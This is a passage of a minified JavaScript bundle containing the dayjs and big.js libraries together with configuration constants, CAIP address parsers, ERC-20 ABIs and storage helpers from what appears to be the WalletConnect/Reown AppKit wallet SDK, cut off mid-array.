B(q,{locale:P.$L,utc:P.$u,x:P.$x,$offset:P.$offset})};var M=(function(){function q(C){this.$L=T(C.locale,null,!0),this.parse(C),this.$x=this.$x||C.x||{},this[_]=!0}var P=q.prototype;return P.parse=function(C){this.$d=(function(j){var z=j.date,$=j.utc;if(z===null)return new Date(NaN);if(U.u(z))return new Date;if(z instanceof Date)return new Date(z);if(typeof z=="string"&&!/Z$/i.test(z)){var H=z.match(E);if(H){var L=H[2]-1||0,V=(H[7]||"0").substring(0,3);return $?new Date(Date.UTC(H[1],L,H[3]||1,H[4]||0,H[5]||0,H[6]||0,V)):new Date(H[1],L,H[3]||1,H[4]||0,H[5]||0,H[6]||0,V)}}return new Date(z)})(C),this.init()},P.init=function(){var C=this.$d;this.$y=C.getFullYear(),this.$M=C.getMonth(),this.$D=C.getDate(),this.$W=C.getDay(),this.$H=C.getHours(),this.$m=C.getMinutes(),this.$s=C.getSeconds(),this.$ms=C.getMilliseconds()},P.$utils=function(){return U},P.isValid=function(){return this.$d.toString()!==y},P.isSame=function(C,j){var z=B(C);return this.startOf(j)<=z&&z<=this.endOf(j)},P.isAfter=function(C,j){return B(C)<this.startOf(j)},P.isBefore=function(C,j){return this.endOf(j)<B(C)},P.$g=function(C,j,z){return U.u(C)?this[j]:this.set(z,C)},P.unix=function(){return Math.floor(this.valueOf()/1e3)},P.valueOf=function(){return this.$d.getTime()},P.startOf=function(C,j){var z=this,$=!!U.u(j)||j,H=U.p(C),L=function(oe,ue){var be=U.w(z.$u?Date.UTC(z.$y,ue,oe):new Date(z.$y,ue,oe),z);return $?be:be.endOf(l)},V=function(oe,ue){return U.w(z.toDate()[oe].apply(z.toDate("s"),($?[0,0,0,0]:[23,59,59,999]).slice(ue)),z)},G=this.$W,Z=this.$M,J=this.$D,ne="set"+(this.$u?"UTC":"");switch(H){case b:return $?L(1,0):L(31,11);case h:return $?L(1,Z):L(0,Z+1);case f:var re=this.$locale().weekStart||0,le=(G<re?G+7:G)-re;return L($?J-le:J+(6-le),Z);case l:case w:return V(ne+"Hours",0);case c:return V(ne+"Minutes",1);case a:return V(ne+"Seconds",2);case o:return V(ne+"Milliseconds",3);default:return this.clone()}},P.endOf=function(C){return this.startOf(C,!1)},P.$set=function(C,j){var z,$=U.p(C),H="set"+(this.$u?"UTC":""),L=(z={},z[l]=H+"Date",z[w]=H+"Date",z[h]=H+"Month",z[b]=H+"FullYear",z[c]=H+"Hours",z[a]=H+"Minutes",z[o]=H+"Seconds",z[s]=H+"Milliseconds",z)[$],V=$===l?this.$D+(j-this.$W):j;if($===h||$===b){var G=this.clone().set(w,1);G.$d[L](V),G.init(),this.$d=G.set(w,Math.min(this.$D,G.daysInMonth())).$d}else L&&this.$d[L](V);return this.init(),this},P.set=function(C,j){return this.clone().$set(C,j)},P.get=function(C){return this[U.p(C)]()},P.add=function(C,j){var z,$=this;C=Number(C);var H=U.p(j),L=function(Z){var J=B($);return U.w(J.date(J.date()+Math.round(Z*C)),$)};if(H===h)return this.set(h,this.$M+C);if(H===b)return this.set(b,this.$y+C);if(H===l)return L(1);if(H===f)return L(7);var V=(z={},z[a]=r,z[c]=i,z[o]=n,z)[H]||1,G=this.$d.getTime()+C*V;return U.w(G,this)},P.subtract=function(C,j){return this.add(-1*C,j)},P.format=function(C){var j=this,z=this.$locale();if(!this.isValid())return z.invalidDate||y;var $=C||"YYYY-MM-DDTHH:mm:ssZ",H=U.z(this),L=this.$H,V=this.$m,G=this.$M,Z=z.weekdays,J=z.months,ne=z.meridiem,re=function(ue,be,Me,Te){return ue&&(ue[be]||ue(j,$))||Me[be].slice(0,Te)},le=function(ue){return U.s(L%12||12,ue,"0")},oe=ne||function(ue,be,Me){var Te=ue<12?"AM":"PM";return Me?Te.toLowerCase():Te};return $.replace(A,(function(ue,be){return be||(function(Me){switch(Me){case"YY":return String(j.$y).slice(-2);case"YYYY":return U.s(j.$y,4,"0");case"M":return G+1;case"MM":return U.s(G+1,2,"0");case"MMM":return re(z.monthsShort,G,J,3);case"MMMM":return re(J,G);case"D":return j.$D;case"DD":return U.s(j.$D,2,"0");case"d":return String(j.$W);case"dd":return re(z.weekdaysMin,j.$W,Z,2);case"ddd":return re(z.weekdaysShort,j.$W,Z,3);case"dddd":return Z[j.$W];case"H":return String(L);case"HH":return U.s(L,2,"0");case"h":return le(1);case"hh":return le(2);case"a":return oe(L,V,!0);case"A":return oe(L,V,!1);case"m":return String(V);case"mm":return U.s(V,2,"0");case"s":return String(j.$s);case"ss":return U.s(j.$s,2,"0");case"SSS":return U.s(j.$ms,3,"0");case"Z":return H}return null})(ue)||H.replace(":","")}))},P.utcOffset=function(){return 15*-Math.round(this.$d.getTimezoneOffset()/15)},P.diff=function(C,j,z){var $,H=this,L=U.p(j),V=B(C),G=(V.utcOffset()-this.utcOffset())*r,Z=this-V,J=function(){return U.m(H,V)};switch(L){case b:$=J()/12;break;case h:$=J();break;case m:$=J()/3;break;case f:$=(Z-G)/6048e5;break;case l:$=(Z-G)/864e5;break;case c:$=Z/i;break;case a:$=Z/r;break;case o:$=Z/n;break;default:$=Z}return z?$:U.a($)},P.daysInMonth=function(){return this.endOf(h).$D},P.$locale=function(){return O[this.$L]},P.locale=function(C,j){if(!C)return this.$L;var z=this.clone(),$=T(C,j,!0);return $&&(z.$L=$),z},P.clone=function(){return U.w(this.$d,this)},P.toDate=function(){return new Date(this.valueOf())},P.toJSON=function(){return this.isValid()?this.toISOString():null},P.toISOString=function(){return this.$d.toISOString()},P.toString=function(){return this.$d.toUTCString()},q})(),N=M.prototype;return B.prototype=N,[["$ms",s],["$s",o],["$m",a],["$H",c],["$W",l],["$M",h],["$y",b],["$D",w]].forEach((function(q){N[q[1]]=function(P){return this.$g(P,q[0],q[1])}})),B.extend=function(q,P){return q.$i||(q(P,M,B),q.$i=!0),B},B.locale=T,B.isDayjs=I,B.unix=function(q){return B(1e3*q)},B.en=O[k],B.Ls=O,B.p={},B}))})(jT)),jT.exports}var M0e=j0e();const Qb=Vf(M0e);var MT={exports:{}},U0e=MT.exports,J$;function L0e(){return J$||(J$=1,(function(t,e){(function(n,r){t.exports=r()})(U0e,(function(){return{name:"en",weekdays:"Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),months:"January_February_March_April_May_June_July_August_September_October_November_December".split("_"),ordinal:function(n){var r=["th","st","nd","rd"],i=n%100;return"["+n+(r[(i-20)%10]||r[i]||r[0])+"]"}}}))})(MT)),MT.exports}var F0e=L0e();const $0e=Vf(F0e);var UT={exports:{}},H0e=UT.exports,X$;function z0e(){return X$||(X$=1,(function(t,e){(function(n,r){t.exports=r()})(H0e,(function(){return function(n,r,i){n=n||{};var s=r.prototype,o={future:"in %s",past:"%s ago",s:"a few seconds",m:"a minute",mm:"%d minutes",h:"an hour",hh:"%d hours",d:"a day",dd:"%d days",M:"a month",MM:"%d months",y:"a year",yy:"%d years"};function a(l,f,h,m){return s.fromToBase(l,f,h,m)}i.en.relativeTime=o,s.fromToBase=function(l,f,h,m,b){for(var w,y,E,A=h.$locale().relativeTime||o,R=n.thresholds||[{l:"s",r:44,d:"second"},{l:"m",r:89},{l:"mm",r:44,d:"minute"},{l:"h",r:89},{l:"hh",r:21,d:"hour"},{l:"d",r:35},{l:"dd",r:25,d:"day"},{l:"M",r:45},{l:"MM",r:10,d:"month"},{l:"y",r:17},{l:"yy",d:"year"}],S=R.length,v=0;v<S;v+=1){var k=R[v];k.d&&(w=m?i(l).diff(h,k.d,!0):h.diff(l,k.d,!0));var O=(n.rounding||Math.round)(Math.abs(w));if(E=w>0,O<=k.r||!k.r){O<=1&&v>0&&(k=R[v-1]);var _=A[k.l];b&&(O=b(""+O)),y=typeof _=="string"?_.replace("%d",O):_(O,f,k.l,E);break}}if(f)return y;var I=E?A.future:A.past;return typeof I=="function"?I(y):I.replace("%s",y)},s.to=function(l,f){return a(l,f,this,!0)},s.from=function(l,f){return a(l,f,this)};var c=function(l){return l.$u?i.utc():i()};s.toNow=function(l){return this.to(c(this),l)},s.fromNow=function(l){return this.from(c(this),l)}}}))})(UT)),UT.exports}var q0e=z0e();const V0e=Vf(q0e);var LT={exports:{}},W0e=LT.exports,eH;function G0e(){return eH||(eH=1,(function(t,e){(function(n,r){t.exports=r()})(W0e,(function(){return function(n,r,i){i.updateLocale=function(s,o){var a=i.Ls[s];if(a)return(o?Object.keys(o):[]).forEach((function(c){a[c]=o[c]})),a}}}))})(LT)),LT.exports}var K0e=G0e();const Z0e=Vf(K0e);Qb.extend(V0e);Qb.extend(Z0e);const Y0e={...$0e,name:"en-web3-modal",relativeTime:{future:"in %s",past:"%s ago",s:"%d sec",m:"1 min",mm:"%d min",h:"1 hr",hh:"%d hrs",d:"1 d",dd:"%d d",M:"1 mo",MM:"%d mo",y:"1 yr",yy:"%d yr"}},Q0e=["January","February","March","April","May","June","July","August","September","October","November","December"];Qb.locale("en-web3-modal",Y0e);const Ik={getMonthNameByIndex(t){return Q0e[t]},getYear(t=new Date().toISOString()){return Qb(t).year()},getRelativeDateFromNow(t){return Qb(t).locale("en-web3-modal").fromNow(!0)},formatDate(t,e="DD MMM"){return Qb(t).format(e)}};var tH={};const ge={WC_NAME_SUFFIX:".reown.id",WC_NAME_SUFFIX_LEGACY:".wcn.id",BLOCKCHAIN_API_RPC_URL:"https://rpc.walletconnect.org",PULSE_API_URL:"https://pulse.walletconnect.org",W3M_API_URL:"https://api.web3modal.org",CONNECTOR_ID:{WALLET_CONNECT:"walletConnect",INJECTED:"injected",WALLET_STANDARD:"announced",COINBASE:"coinbaseWallet",COINBASE_SDK:"coinbaseWalletSDK",BASE_ACCOUNT:"baseAccount",SAFE:"safe",LEDGER:"ledger",OKX:"okx",EIP6963:"eip6963",AUTH:"AUTH"},CONNECTOR_NAMES:{AUTH:"Auth"},AUTH_CONNECTOR_SUPPORTED_CHAINS:["eip155","solana"],LIMITS:{PENDING_TRANSACTIONS:99},CHAIN:{EVM:"eip155",SOLANA:"solana",POLKADOT:"polkadot",BITCOIN:"bip122",TON:"ton"},CHAIN_NAME_MAP:{eip155:"EVM Networks",solana:"Solana",polkadot:"Polkadot",bip122:"Bitcoin",cosmos:"Cosmos",sui:"Sui",stacks:"Stacks",ton:"TON"},ADAPTER_TYPES:{BITCOIN:"bitcoin",SOLANA:"solana",WAGMI:"wagmi",ETHERS:"ethers",ETHERS5:"ethers5",TON:"ton"},USDT_CONTRACT_ADDRESSES:["0xdac17f958d2ee523a2206206994597c13d831ec7","0xc2132d05d31c914a87c6611c10748aeb04b58e8f","0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7","0x919C1c267BC06a7039e03fcc2eF738525769109c","0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e","0x55d398326f99059fF775485246999027B3197955","0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9"],SOLANA_SPL_TOKEN_ADDRESSES:{SOL:"So11111111111111111111111111111111111111112"},HTTP_STATUS_CODES:{SERVER_ERROR:500,TOO_MANY_REQUESTS:429,SERVICE_UNAVAILABLE:503,FORBIDDEN:403},UNSUPPORTED_NETWORK_NAME:"Unknown Network",SECURE_SITE_SDK_ORIGIN:(typeof process<"u"&&typeof tH<"u"?tH.NEXT_PUBLIC_SECURE_SITE_ORIGIN:void 0)||"https://secure.walletconnect.org",REMOTE_FEATURES_ALERTS:{MULTI_WALLET_NOT_ENABLED:{DEFAULT:{displayMessage:"Multi-Wallet Not Enabled",debugMessage:"Multi-wallet support is not enabled. Please enable it in your AppKit configuration at cloud.reown.com."},CONNECTIONS_HOOK:{displayMessage:"Multi-Wallet Not Enabled",debugMessage:"Multi-wallet support is not enabled. Please enable it in your AppKit configuration at cloud.reown.com to use the useAppKitConnections hook."},CONNECTION_HOOK:{displayMessage:"Multi-Wallet Not Enabled",debugMessage:"Multi-wallet support is not enabled. Please enable it in your AppKit configuration at cloud.reown.com to use the useAppKitConnection hook."}}},IS_DEVELOPMENT:typeof process<"u"&&!1,DEFAULT_ALLOWED_ANCESTORS:["http://localhost:*","https://localhost:*","http://127.0.0.1:*","https://127.0.0.1:*","https://*.pages.dev","https://*.vercel.app","https://*.ngrok-free.app","https://secure-mobile.walletconnect.com","https://secure-mobile.walletconnect.org"]},bre={caipNetworkIdToNumber(t){return t?Number(t.split(":")[1]):void 0},parseEvmChainId(t){return typeof t=="string"?this.caipNetworkIdToNumber(t):t},getNetworksByNamespace(t,e){return t?.filter(n=>n.chainNamespace===e)||[]},getFirstNetworkByNamespace(t,e){return this.getNetworksByNamespace(t,e)[0]},getNetworkNameByCaipNetworkId(t,e){if(!e)return;const n=t.find(i=>i.caipNetworkId===e);if(n)return n.name;const[r]=e.split(":");return ge.CHAIN_NAME_MAP?.[r]||void 0}},wre=["eip155","solana","polkadot","bip122","cosmos","sui","stacks"];var J0e=20,X0e=1,tg=1e6,nH=1e6,eme=-7,tme=21,nme=!1,q_="[big.js] ",jg=q_+"Invalid ",MI=jg+"decimal places",rme=jg+"rounding mode",vre=q_+"Division by zero",tr={},Ul=void 0,ime=/^-?(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i;function Ere(){function t(e){var n=this;if(!(n instanceof t))return e===Ul?Ere():new t(e);if(e instanceof t)n.s=e.s,n.e=e.e,n.c=e.c.slice();else{if(typeof e!="string"){if(t.strict===!0&&typeof e!="bigint")throw TypeError(jg+"value");e=e===0&&1/e<0?"-0":String(e)}sme(n,e)}n.constructor=t}return t.prototype=tr,t.DP=J0e,t.RM=X0e,t.NE=eme,t.PE=tme,t.strict=nme,t.roundDown=0,t.roundHalfUp=1,t.roundHalfEven=2,t.roundUp=3,t}function sme(t,e){var n,r,i;if(!ime.test(e))throw Error(jg+"number");for(t.s=e.charAt(0)=="-"?(e=e.slice(1),-1):1,(n=e.indexOf("."))>-1&&(e=e.replace(".","")),(r=e.search(/e/i))>0?(n<0&&(n=r),n+=+e.slice(r+1),e=e.substring(0,r)):n<0&&(n=e.length),i=e.length,r=0;r<i&&e.charAt(r)=="0";)++r;if(r==i)t.c=[t.e=0];else{for(;i>0&&e.charAt(--i)=="0";);for(t.e=n-r-1,t.c=[],n=0;r<=i;)t.c[n++]=+e.charAt(r++)}return t}function Mg(t,e,n,r){var i=t.c;if(n===Ul&&(n=t.constructor.RM),n!==0&&n!==1&&n!==2&&n!==3)throw Error(rme);if(e<1)r=n===3&&(r||!!i[0])||e===0&&(n===1&&i[0]>=5||n===2&&(i[0]>5||i[0]===5&&(r||i[1]!==Ul))),i.length=1,r?(t.e=t.e-e+1,i[0]=1):i[0]=t.e=0;else if(e<i.length){if(r=n===1&&i[e]>=5||n===2&&(i[e]>5||i[e]===5&&(r||i[e+1]!==Ul||i[e-1]&1))||n===3&&(r||!!i[0]),i.length=e,r){for(;++i[--e]>9;)if(i[e]=0,e===0){++t.e,i.unshift(1);break}}for(e=i.length;!i[--e];)i.pop()}return t}function Ug(t,e,n){var r=t.e,i=t.c.join(""),s=i.length;if(e)i=i.charAt(0)+(s>1?"."+i.slice(1):"")+(r<0?"e":"e+")+r;else if(r<0){for(;++r;)i="0"+i;i="0."+i}else if(r>0)if(++r>s)for(r-=s;r--;)i+="0";else r<s&&(i=i.slice(0,r)+"."+i.slice(r));else s>1&&(i=i.charAt(0)+"."+i.slice(1));return t.s<0&&n?"-"+i:i}tr.abs=function(){var t=new this.constructor(this);return t.s=1,t};tr.cmp=function(t){var e,n=this,r=n.c,i=(t=new n.constructor(t)).c,s=n.s,o=t.s,a=n.e,c=t.e;if(!r[0]||!i[0])return r[0]?s:i[0]?-o:0;if(s!=o)return s;if(e=s<0,a!=c)return a>c^e?1:-1;for(o=(a=r.length)<(c=i.length)?a:c,s=-1;++s<o;)if(r[s]!=i[s])return r[s]>i[s]^e?1:-1;return a==c?0:a>c^e?1:-1};tr.div=function(t){var e=this,n=e.constructor,r=e.c,i=(t=new n(t)).c,s=e.s==t.s?1:-1,o=n.DP;if(o!==~~o||o<0||o>tg)throw Error(MI);if(!i[0])throw Error(vre);if(!r[0])return t.s=s,t.c=[t.e=0],t;var a,c,l,f,h,m=i.slice(),b=a=i.length,w=r.length,y=r.slice(0,a),E=y.length,A=t,R=A.c=[],S=0,v=o+(A.e=e.e-t.e)+1;for(A.s=s,s=v<0?0:v,m.unshift(0);E++<a;)y.push(0);do{for(l=0;l<10;l++){if(a!=(E=y.length))f=a>E?1:-1;else for(h=-1,f=0;++h<a;)if(i[h]!=y[h]){f=i[h]>y[h]?1:-1;break}if(f<0){for(c=E==a?i:m;E;){if(y[--E]<c[E]){for(h=E;h&&!y[--h];)y[h]=9;--y[h],y[E]+=10}y[E]-=c[E]}for(;!y[0];)y.shift()}else break}R[S++]=f?l:++l,y[0]&&f?y[E]=r[b]||0:y=[r[b]]}while((b++<w||y[0]!==Ul)&&s--);return!R[0]&&S!=1&&(R.shift(),A.e--,v--),S>v&&Mg(A,v,n.RM,y[0]!==Ul),A};tr.eq=function(t){return this.cmp(t)===0};tr.gt=function(t){return this.cmp(t)>0};tr.gte=function(t){return this.cmp(t)>-1};tr.lt=function(t){return this.cmp(t)<0};tr.lte=function(t){return this.cmp(t)<1};tr.minus=tr.sub=function(t){var e,n,r,i,s=this,o=s.constructor,a=s.s,c=(t=new o(t)).s;if(a!=c)return t.s=-c,s.plus(t);var l=s.c.slice(),f=s.e,h=t.c,m=t.e;if(!l[0]||!h[0])return h[0]?t.s=-c:l[0]?t=new o(s):t.s=1,t;if(a=f-m){for((i=a<0)?(a=-a,r=l):(m=f,r=h),r.reverse(),c=a;c--;)r.push(0);r.reverse()}else for(n=((i=l.length<h.length)?l:h).length,a=c=0;c<n;c++)if(l[c]!=h[c]){i=l[c]<h[c];break}if(i&&(r=l,l=h,h=r,t.s=-t.s),(c=(n=h.length)-(e=l.length))>0)for(;c--;)l[e++]=0;for(c=e;n>a;){if(l[--n]<h[n]){for(e=n;e&&!l[--e];)l[e]=9;--l[e],l[n]+=10}l[n]-=h[n]}for(;l[--c]===0;)l.pop();for(;l[0]===0;)l.shift(),--m;return l[0]||(t.s=1,l=[m=0]),t.c=l,t.e=m,t};tr.mod=function(t){var e,n=this,r=n.constructor,i=n.s,s=(t=new r(t)).s;if(!t.c[0])throw Error(vre);return n.s=t.s=1,e=t.cmp(n)==1,n.s=i,t.s=s,e?new r(n):(i=r.DP,s=r.RM,r.DP=r.RM=0,n=n.div(t),r.DP=i,r.RM=s,this.minus(n.times(t)))};tr.neg=function(){var t=new this.constructor(this);return t.s=-t.s,t};tr.plus=tr.add=function(t){var e,n,r,i=this,s=i.constructor;if(t=new s(t),i.s!=t.s)return t.s=-t.s,i.minus(t);var o=i.e,a=i.c,c=t.e,l=t.c;if(!a[0]||!l[0])return l[0]||(a[0]?t=new s(i):t.s=i.s),t;if(a=a.slice(),e=o-c){for(e>0?(c=o,r=l):(e=-e,r=a),r.reverse();e--;)r.push(0);r.reverse()}for(a.length-l.length<0&&(r=l,l=a,a=r),e=l.length,n=0;e;a[e]%=10)n=(a[--e]=a[e]+l[e]+n)/10|0;for(n&&(a.unshift(n),++c),e=a.length;a[--e]===0;)a.pop();return t.c=a,t.e=c,t};tr.pow=function(t){var e=this,n=new e.constructor("1"),r=n,i=t<0;if(t!==~~t||t<-nH||t>nH)throw Error(jg+"exponent");for(i&&(t=-t);t&1&&(r=r.times(e)),t>>=1,!!t;)e=e.times(e);return i?n.div(r):r};tr.prec=function(t,e){if(t!==~~t||t<1||t>tg)throw Error(jg+"precision");return Mg(new this.constructor(this),t,e)};tr.round=function(t,e){if(t===Ul)t=0;else if(t!==~~t||t<-tg||t>tg)throw Error(MI);return Mg(new this.constructor(this),t+this.e+1,e)};tr.sqrt=function(){var t,e,n,r=this,i=r.constructor,s=r.s,o=r.e,a=new i("0.5");if(!r.c[0])return new i(r);if(s<0)throw Error(q_+"No square root");s=Math.sqrt(+Ug(r,!0,!0)),s===0||s===1/0?(e=r.c.join(""),e.length+o&1||(e+="0"),s=Math.sqrt(e),o=((o+1)/2|0)-(o<0||o&1),t=new i((s==1/0?"5e":(s=s.toExponential()).slice(0,s.indexOf("e")+1))+o)):t=new i(s+""),o=t.e+(i.DP+=4);do n=t,t=a.times(n.plus(r.div(n)));while(n.c.slice(0,o).join("")!==t.c.slice(0,o).join(""));return Mg(t,(i.DP-=4)+t.e+1,i.RM)};tr.times=tr.mul=function(t){var e,n=this,r=n.constructor,i=n.c,s=(t=new r(t)).c,o=i.length,a=s.length,c=n.e,l=t.e;if(t.s=n.s==t.s?1:-1,!i[0]||!s[0])return t.c=[t.e=0],t;for(t.e=c+l,o<a&&(e=i,i=s,s=e,l=o,o=a,a=l),e=new Array(l=o+a);l--;)e[l]=0;for(c=a;c--;){for(a=0,l=o+c;l>c;)a=e[l]+s[c]*i[l-c-1]+a,e[l--]=a%10,a=a/10|0;e[l]=a}for(a?++t.e:e.shift(),c=e.length;!e[--c];)e.pop();return t.c=e,t};tr.toExponential=function(t,e){var n=this,r=n.c[0];if(t!==Ul){if(t!==~~t||t<0||t>tg)throw Error(MI);for(n=Mg(new n.constructor(n),++t,e);n.c.length<t;)n.c.push(0)}return Ug(n,!0,!!r)};tr.toFixed=function(t,e){var n=this,r=n.c[0];if(t!==Ul){if(t!==~~t||t<0||t>tg)throw Error(MI);for(n=Mg(new n.constructor(n),t+n.e+1,e),t=t+n.e+1;n.c.length<t;)n.c.push(0)}return Ug(n,!1,!!r)};tr[Symbol.for("nodejs.util.inspect.custom")]=tr.toJSON=tr.toString=function(){var t=this,e=t.constructor;return Ug(t,t.e<=e.NE||t.e>=e.PE,!!t.c[0])};tr.toNumber=function(){var t=+Ug(this,!0,!0);if(this.constructor.strict===!0&&!this.eq(t.toString()))throw Error(q_+"Imprecise conversion");return t};tr.toPrecision=function(t,e){var n=this,r=n.constructor,i=n.c[0];if(t!==Ul){if(t!==~~t||t<1||t>tg)throw Error(jg+"precision");for(n=Mg(new r(n),t,e);n.c.length<t;)n.c.push(0)}return Ug(n,t<=n.e||n.e<=r.NE||n.e>=r.PE,!!i)};tr.valueOf=function(){var t=this,e=t.constructor;if(e.strict===!0)throw Error(q_+"valueOf disallowed");return Ug(t,t.e<=e.NE||t.e>=e.PE,!0)};var jh=Ere();const CE={bigNumber(t){return t?new jh(t):new jh(0)},multiply(t,e){if(t===void 0||e===void 0)return new jh(0);const n=new jh(t),r=new jh(e);return n.times(r)},toFixed(t,e=2){return t===void 0||t===""?new jh(0).toFixed(e):new jh(t).toFixed(e)},formatNumberToLocalString(t,e=2){return t===void 0||t===""?"0.00":typeof t=="number"?t.toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e,roundingMode:"floor"}):parseFloat(t).toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e,roundingMode:"floor"})},parseLocalStringToNumber(t){if(t===void 0||t==="")return 0;const e=t.replace(/,/gu,"");return new jh(e).toNumber()}},ome=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],ame=[{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]}],cme=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],ume={getERC20Abi:t=>ge.USDT_CONTRACT_ADDRESSES.includes(t)?cme:ome,getSwapAbi:()=>ame},lme={URLS:{FAQ:"https://walletconnect.com/faq"}},gi={validateCaipAddress(t){if(t.split(":")?.length!==3)throw new Error("Invalid CAIP Address");return t},parseCaipAddress(t){const e=t.split(":");if(e.length!==3)throw new Error(`Invalid CAIP-10 address: ${t}`);const[n,r,i]=e;if(!n||!r||!i)throw new Error(`Invalid CAIP-10 address: ${t}`);return{chainNamespace:n,chainId:r,address:i}},parseCaipNetworkId(t){const e=t.split(":");if(e.length!==2)throw new Error(`Invalid CAIP-2 network id: ${t}`);const[n,r]=e;if(!n||!r)throw new Error(`Invalid CAIP-2 network id: ${t}`);return{chainNamespace:n,chainId:r}}},Ka={RPC_ERROR_CODE:{USER_REJECTED_REQUEST:4001,USER_REJECTED_METHODS:5002,USER_REJECTED:5e3},PROVIDER_RPC_ERROR_NAME:{PROVIDER_RPC:"ProviderRpcError",USER_REJECTED_REQUEST:"UserRejectedRequestError"},isRpcProviderError(t){try{if(typeof t=="object"&&t!==null){const e=t,n=typeof e.message=="string",r=typeof e.code=="number";return n&&r}return!1}catch{return!1}},isUserRejectedMessage(t){return t.toLowerCase().includes("user rejected")||t.toLowerCase().includes("user cancelled")||t.toLowerCase().includes("user canceled")},isUserRejectedRequestError(t){if(Ka.isRpcProviderError(t)){const e=t.code===Ka.RPC_ERROR_CODE.USER_REJECTED_REQUEST,n=t.code===Ka.RPC_ERROR_CODE.USER_REJECTED_METHODS;return e||n||Ka.isUserRejectedMessage(t.message)}return t instanceof Error?Ka.isUserRejectedMessage(t.message):!1}};let dme=class extends Error{constructor(e,n){super(n.message,{cause:e}),this.name=Ka.PROVIDER_RPC_ERROR_NAME.PROVIDER_RPC,this.code=n.code}},JD=class extends dme{constructor(e){super(e,{code:Ka.RPC_ERROR_CODE.USER_REJECTED_REQUEST,message:"User rejected the request"}),this.name=Ka.PROVIDER_RPC_ERROR_NAME.USER_REJECTED_REQUEST}};const St={WALLET_ID:"@appkit/wallet_id",WALLET_NAME:"@appkit/wallet_name",SOLANA_WALLET:"@appkit/solana_wallet",SOLANA_CAIP_CHAIN:"@appkit/solana_caip_chain",ACTIVE_CAIP_NETWORK_ID:"@appkit/active_caip_network_id",CONNECTED_SOCIAL:"@appkit/connected_social",CONNECTED_SOCIAL_USERNAME:"@appkit-wallet/SOCIAL_USERNAME",RECENT_WALLETS:"@appkit/recent_wallets",RECENT_WALLET:"@appkit/recent_wallet",DEEPLINK_CHOICE:"WALLETCONNECT_DEEPLINK_CHOICE",ACTIVE_NAMESPACE:"@appkit/active_namespace",CONNECTED_NAMESPACES:"@appkit/connected_namespaces",CONNECTION_STATUS:"@appkit/connection_status",SIWX_AUTH_TOKEN:"@appkit/siwx-auth-token",SIWX_NONCE_TOKEN:"@appkit/siwx-nonce-token",TELEGRAM_SOCIAL_PROVIDER:"@appkit/social_provider",NATIVE_BALANCE_CACHE:"@appkit/native_balance_cache",PORTFOLIO_CACHE:"@appkit/portfolio_cache",ENS_CACHE:"@appkit/ens_cache",IDENTITY_CACHE:"@appkit/identity_cache",PREFERRED_ACCOUNT_TYPES:"@appkit/preferred_account_types",CONNECTIONS:"@appkit/connections",DISCONNECTED_CONNECTOR_IDS:"@appkit/disconnected_connector_ids",HISTORY_TRANSACTIONS_CACHE:"@appkit/history_transactions_cache",TOKEN_PRICE_CACHE:"@appkit/token_price_cache",RECENT_EMAILS:"@appkit/recent_emails",LATEST_APPKIT_VERSION:"@appkit/latest_version",TON_WALLETS_CACHE:"@appkit/ton_wallets_cache"};function AN(t){if(!t)throw new Error("Namespace is required for CONNECTED_CONNECTOR_ID");return`@appkit/${t}:connected_connector_id`}const _t={setItem(t,e){q2()&&e!==void 0&&localStorage.setItem(t,e)},getItem(t){if(q2())return localStorage.getItem(t)||void 0},removeItem(t){q2()&&localStorage.removeItem(t)},clear(){q2()&&localStorage.clear()}};function q2(){return typeof window<"u"&&typeof localStorage<"u"}function SE(t,e){const n=t?.["--apkt-accent"]??t?.["--w3m-accent"];return e==="light"?{"--w3m-accent":n||"hsla(231, 100%, 70%, 1)","--w3m-background":"#fff"}:{"--w3m-accent":n||"hsla(230, 100%, 67%, 1)","--w3m-background":"#202020"}}var rH={};const CN=(typeof process<"u"&&typeof rH<"u"?rH.NEXT_PUBLIC_SECURE_SITE_ORIGIN:void 0)||"https://secure.walletconnect.org",_re=[{label:"Meld.io",name:"meld",feeRange:"1-2%",url:"https://meldcrypto.com",supportedChains:["eip155","solana"]}],fme="WXETMuFUQmqqybHuRkSgxv:25B8LJHSfpG6LVjR2ytU5Cwh7Z4Sch2ocoU",jt={FOUR_MINUTES_MS:24e4,TEN_SEC_MS:1e4,FIVE_SEC_MS:5e3,THREE_SEC_MS:3e3,ONE_SEC_MS:1e3,SECURE_SITE:CN,SECURE_SITE_DASHBOARD:`${CN}/dashboard`,SECURE_SITE_FAVICON:`${CN}/images/favicon.png`,SOLANA_NATIVE_TOKEN_ADDRESS:"So11111111111111111111111111111111111111111",RESTRICTED_TIMEZONES:["ASIA/SHANGHAI","ASIA/URUMQI","ASIA/CHONGQING","ASIA/HARBIN","ASIA/KASHGAR","ASIA/MACAU","ASIA/HONG_KONG","ASIA/MACAO","ASIA/BEIJING","ASIA/HARBIN"],SWAP_SUGGESTED_TOKENS:["ETH","UNI","1INCH","AAVE","SOL","ADA","AVAX","DOT","LINK","NITRO","GAIA","MILK","TRX","NEAR","GNO","WBTC","DAI","WETH","USDC","USDT","ARB","BAL","BICO","CRV","ENS","MATIC","OP"],SWAP_POPULAR_TOKENS:["ETH","UNI","1INCH","AAVE","SOL","ADA","AVAX","DOT","LINK","NITRO","GAIA","MILK","TRX","NEAR","GNO","WBTC","DAI","WETH","USDC","USDT","ARB","BAL","BICO","CRV","ENS","MATIC","OP","METAL","DAI","CHAMP","WOLF","SALE","BAL","BUSD","MUST","BTCpx","ROUTE","HEX","WEL